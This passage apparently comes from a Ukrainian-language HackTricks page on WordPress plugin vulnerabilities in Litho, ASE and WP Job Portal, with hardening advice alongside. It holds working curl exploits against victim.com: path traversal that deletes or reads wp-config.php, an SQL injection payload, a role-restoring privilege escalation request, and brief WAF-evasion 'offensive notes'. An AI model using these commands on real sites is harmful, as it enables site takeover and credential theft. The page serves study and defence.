–ù–∞–ø–∞–¥–Ω–∏–∫ –º–æ–∂–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –∞–±–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é **–Ω–∏–∂—á–µ –±–∞–∑–æ–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó uploads** (–∑–∞–∑–≤–∏—á–∞–π `<wp-root>/wp-content/uploads/`) –≤—ñ–¥–ø—Ä–∞–≤–∏–≤—à–∏ –æ–¥–∏–Ω HTTP POST-–∑–∞–ø–∏—Ç:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
–û—Å–∫—ñ–ª—å–∫–∏ `wp-config.php` –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –ø–æ–∑–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—î—é *uploads*, —á–æ—Ç–∏—Ä–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ `../` –¥–æ—Å—Ç–∞—Ç–Ω—ñ –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ—ó —ñ–Ω—Å—Ç–∞–ª—è—Ü—ñ—ó. –í–∏–¥–∞–ª–µ–Ω–Ω—è `wp-config.php` –ø—Ä–∏–º—É—à—É—î WordPress –ø—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—ñ –ø–µ—Ä–µ–π—Ç–∏ –≤ *–º–∞–π—Å—Ç–µ—Ä –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è*, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–≤–Ω–∏–π site take-over (–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ª–∏—à–µ –Ω–∞–¥–∞—î –Ω–æ–≤—É DB –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ —Å—Ç–≤–æ—Ä—é—î admin-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞).

–Ü–Ω—à—ñ –≤–ø–ª–∏–≤–æ–≤—ñ —Ü—ñ–ª—ñ –≤–∫–ª—é—á–∞—é—Ç—å plugin/theme `.php` —Ñ–∞–π–ª–∏ (—â–æ–± –∑–ª–∞–º–∞—Ç–∏ security plugins) –∞–±–æ –ø—Ä–∞–≤–∏–ª–∞ `.htaccess`.

#### –ö–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π —Å–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è

* –ë—É–¥—å-—è–∫–∏–π callback `add_action( 'wp_ajax_nopriv_...')`, —è–∫–∏–π –≤–∏–∫–ª–∏–∫–∞—î filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, —Ç–æ—â–æ).
* –ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è –Ω–µ—Å–∞–Ω—ñ—Ç–∏–∑–æ–≤–∞–Ω–æ–≥–æ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ —à–ª—è—Ö–∏ (—à—É–∫–∞–π—Ç–µ `$_POST`, `$_GET`, `$_REQUEST`).
* –í—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `check_ajax_referer()` —Ç–∞ `current_user_can()`/`is_user_logged_in()`.

#### –ü—ñ–¥—Å–∏–ª–µ–Ω–Ω—è –∑–∞—Ö–∏—Å—Ç—É
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **–ó–∞–≤–∂–¥–∏** –≤–≤–∞–∂–∞–π—Ç–µ –±—É–¥—å-—è–∫—É –æ–ø–µ—Ä–∞—Ü—ñ—é –∑–∞–ø–∏—Å—É/–≤–∏–¥–∞–ª–µ–Ω–Ω—è –Ω–∞ –¥–∏—Å–∫—É –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ—é —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ:
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

–ë–∞–≥–∞—Ç–æ –ø–ª–∞–≥—ñ–Ω—ñ–≤ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å "view as role" –∞–±–æ —Ç–∏–º—á–∞—Å–æ–≤—É –∑–º—ñ–Ω—É —Ä–æ–ª—ñ, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ –≤ user meta, —â–æ–± –ø—ñ–∑–Ω—ñ—à–µ —ó—Ö –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏. –Ø–∫—â–æ —à–ª—è—Ö –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–∫–ª–∞–¥–∞—î—Ç—å—Å—è —Ç—ñ–ª—å–∫–∏ –Ω–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `$_REQUEST['reset-for']`) —ñ —Å–ø–∏—Å–æ–∫, —â–æ –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è –ø–ª–∞–≥—ñ–Ω–æ–º, –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ capabilities —ñ –¥—ñ–π—Å–Ω–æ–≥–æ nonce, —Ü–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –Ω–∞ vertical privilege escalation.

–†–µ–∞–ª—å–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –±—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ –≤ Admin and Site Enhancements (ASE) plugin (‚â§ 7.6.2.1). –ì—ñ–ª–∫–∞ reset –≤—ñ–¥–Ω–æ–≤–ª—é–≤–∞–ª–∞ —Ä–æ–ª—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ `reset-for=<username>`, —è–∫—â–æ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑'—è–≤–ª—è–ª–æ—Å—è —É –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É –º–∞—Å–∏–≤—ñ `$options['viewing_admin_as_role_are']`, –∞–ª–µ –Ω–µ –≤–∏–∫–æ–Ω—É–≤–∞–ª–∞ –Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ `current_user_can()`, –Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ nonce –ø–µ—Ä–µ–¥ –≤–∏–¥–∞–ª–µ–Ω–Ω—è–º –ø–æ—Ç–æ—á–Ω–∏—Ö —Ä–æ–ª–µ–π —Ç–∞ –ø–æ–≤—Ç–æ—Ä–Ω–∏–º –¥–æ–¥–∞–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —Ä–æ–ª–µ–π –∑ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why it's exploitable

- –î–æ–≤—ñ—Ä—è—î `$_REQUEST['reset-for']` —Ç–∞ –æ–ø—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞ –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.
- –Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Ä–∞–Ω—ñ—à–µ –º–∞–≤ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤ `_asenha_view_admin_as_original_roles`, —ñ —ó—Ö –ø–æ–Ω–∏–∑–∏–ª–∏, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏ —ó—Ö, –∑–≤–µ—Ä–Ω—É–≤—à–∏—Å—å –¥–æ —à–ª—è—Ö—É —Å–∫–∏–¥–∞–Ω–Ω—è.
- –£ –¥–µ—è–∫–∏—Ö —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è—Ö –±—É–¥—å-—è–∫–∏–π authenticated user –º—ñ–≥ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Å–∫–∏–¥–∞–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —â–æ –≤—Å–µ —â–µ –ø—Ä–∏—Å—É—Ç–Ω—î –≤ `viewing_admin_as_role_are` (–ø–æ–º–∏–ª–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó).

Attack prerequisites

- –£—Ä–∞–∑–ª–∏–≤–∞ –≤–µ—Ä—Å—ñ—è –ø–ª–∞–≥—ñ–Ω–∞ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é.
- –¶—ñ–ª—å–æ–≤–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–∞—î –∑–∞—Å—Ç–∞—Ä—ñ–ª—É —Ä–æ–ª—å –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏, –∑–±–µ—Ä–µ–∂–µ–Ω—É –≤ user meta –≤—ñ–¥ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.
- –ë—É–¥—å-—è–∫–∞ authenticated session; –≤—ñ–¥—Å—É—Ç–Ω—ñ–π nonce/capability —É –ø—Ä–æ—Ü–µ—Å—ñ —Å–∫–∏–¥–∞–Ω–Ω—è.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
–ù–∞ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∑–±—ñ—Ä–∫–∞—Ö —Ü–µ –≤–∏–¥–∞–ª—è—î –ø–æ—Ç–æ—á–Ω—ñ —Ä–æ–ª—ñ –π –∑–∞–Ω–æ–≤–æ –¥–æ–¥–∞—î –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `administrator`), —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

Detection checklist

- –®—É–∫–∞–π—Ç–µ —Ñ—É–Ω–∫—Ü—ñ—ó –ø–µ—Ä–µ–º–∏–∫–∞–Ω–Ω—è —Ä–æ–ª–µ–π, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å ‚Äú–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ‚Äù —É user meta (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `_asenha_view_admin_as_original_roles`).
- –í–∏–∑–Ω–∞—á—Ç–µ —à–ª—è—Ö–∏ —Å–∫–∏–¥–∞–Ω–Ω—è/–≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è, —è–∫—ñ:
- –ß–∏—Ç–∞—é—Ç—å —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —ñ–∑ `$_REQUEST` / `$_GET` / `$_POST`.
- –ú–æ–¥–∏—Ñ—ñ–∫—É—é—Ç—å —Ä–æ–ª—ñ —á–µ—Ä–µ–∑ `add_role()` / `remove_role()` –±–µ–∑ `current_user_can()` —ñ `wp_verify_nonce()` / `check_admin_referer()`.
- –ê–≤—Ç–æ—Ä–∏–∑—É—é—Ç—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –º–∞—Å–∏–≤—É –æ–ø—Ü—ñ–π –ø–ª–∞–≥—ñ–Ω–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `viewing_admin_as_role_are`) –∑–∞–º—ñ—Å—Ç—å –ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω—å –∞–∫—Ç–æ—Ä–∞.

Hardening

- –ó–∞–±–µ–∑–ø–µ—á—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω—å –Ω–∞ –∫–æ–∂–Ω—ñ–π –≥—ñ–ª—Ü—ñ, —â–æ –∑–º—ñ–Ω—é—î —Å—Ç–∞–Ω (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `current_user_can('manage_options')` –∞–±–æ —Å—É–≤–æ—Ä—ñ—à–µ).
- –í–∏–º–∞–≥–∞–π—Ç–µ nonces –¥–ª—è –≤—Å—ñ—Ö –∑–º—ñ–Ω —Ä–æ–ª–µ–π/–¥–æ–∑–≤–æ–ª—ñ–≤ —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ —ó—Ö: `check_admin_referer()` / `wp_verify_nonce()`.
- –ù—ñ–∫–æ–ª–∏ –Ω–µ –¥–æ–≤—ñ—Ä—è–π—Ç–µ —ñ–º–µ–Ω–∞–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –Ω–∞–¥–∞–Ω–∏–º —É –∑–∞–ø–∏—Ç—ñ; –≤–∏–∑–Ω–∞—á–∞–π—Ç–µ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –∞–∫—Ç–æ—Ä–∞ —Ç–∞ —è–≤–Ω–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏.
- –Ü–Ω–≤–∞–ª—ñ–¥—É–π—Ç–µ ‚Äú–æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ä–æ–ª—ñ‚Äù –ø—Ä–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è—Ö –ø—Ä–æ—Ñ—ñ–ª—é/—Ä–æ–ª–µ–π, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏—Ö –≤–∏—Å–æ–∫–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –º—ñ–Ω—ñ–º–∞–ª—å–Ω–æ–≥–æ —Å—Ç–∞–Ω—É —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –æ–±–º–µ–∂–µ–Ω–∏–º —á–∞—Å–æ–º –¥—ñ—ó —ñ capability-guarded tokens –¥–ª—è —Ç–∏–º—á–∞—Å–æ–≤–∏—Ö –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω—å —Ä–æ–ª–µ–π.

---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‚Äëimpact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–¢–∞–∫–æ–∂, **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ WordPress**.

### –ü–ª–∞–≥—ñ–Ω–∏ –±–µ–∑–ø–µ–∫–∏

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ **–ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ** **–ø—Ä–∞–≤–∞** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- **–û–±–º–µ–∂—Ç–µ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–ø—Ä–æ–± –≤—Ö–æ–¥—É**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –∞—Ç–∞–∫–∞–º Brute Force
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —ñ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –ª–æ–∫–∞–ª—å–Ω–æ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.


### –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π SQL Injection —á–µ—Ä–µ–∑ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—é –≤–∞–ª—ñ–¥–∞—Ü—ñ—é (WP Job Portal <= 2.3.2)

–ü–ª–∞–≥—ñ–Ω —Ä–µ–∫—Ä—É—Ç–∏–Ω–≥—É WP Job Portal –≤—ñ–¥–∫—Ä–∏–≤ –∑–∞–≤–¥–∞–Ω–Ω—è **savecategory**, —è–∫–µ –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –≤–∏–∫–æ–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ —É `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–∏–∫–ª–∏–∫–∞–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

1. **–í–≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó** ‚Äì `parentid` –Ω–∞–¥—Ö–æ–¥–∏—Ç—å –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTTP-–∑–∞–ø–∏—Ç—É.
2. **–ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Ä—è–¥–∫—ñ–≤ —É WHERE-–∫–ª–∞—É–∑—ñ** ‚Äì –≤—ñ–¥—Å—É—Ç–Ω—ñ `is_numeric()` / `esc_sql()` / prepared statement.
3. **–î–æ—Å—Ç—É–ø –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** ‚Äì —Ö–æ—á–∞ –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `admin-post.php`, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ ‚Äî **CSRF nonce** (`wp_verify_nonce()`), —è–∫–∏–π –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –≤–±—É–¥–æ–≤—É—î —à–æ—Ä—Ç–∫–æ–¥ `[wpjobportal_my_resumes]`.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –û—Ç—Ä–∏–º–∞–π—Ç–µ —Å–≤—ñ–∂–∏–π nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. –Ü–Ω'—î–∫—Ü—ñ—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ SQL, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å —Ä–æ–∑–∫—Ä–∏–≤–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ñ–Ω'—î–∫—Ü—ñ—ó –∞–±–æ –∑–º—ñ–Ω—é—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î SQLi.


### –ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

–©–µ –æ–¥–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è, **downloadcustomfile**, –¥–æ–∑–≤–æ–ª—è–ª–æ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ **–±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É** —á–µ—Ä–µ–∑ path traversal. –í—Ä–∞–∑–ª–∏–≤–∏–π sink –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∞—Ç–∞–∫—É—é—á–∏–º —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è **–±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó**. –ó–Ω–æ–≤—É –∂, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ—à–∫–æ–¥–∞ ‚Äî **CSRF nonce**, —è–∫–∏–π –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —Ä–µ–∑—é–º–µ.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
–°–µ—Ä–≤–µ—Ä –ø–æ–≤–µ—Ä—Ç–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `wp-config.php`, leaking DB credentials and auth keys.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
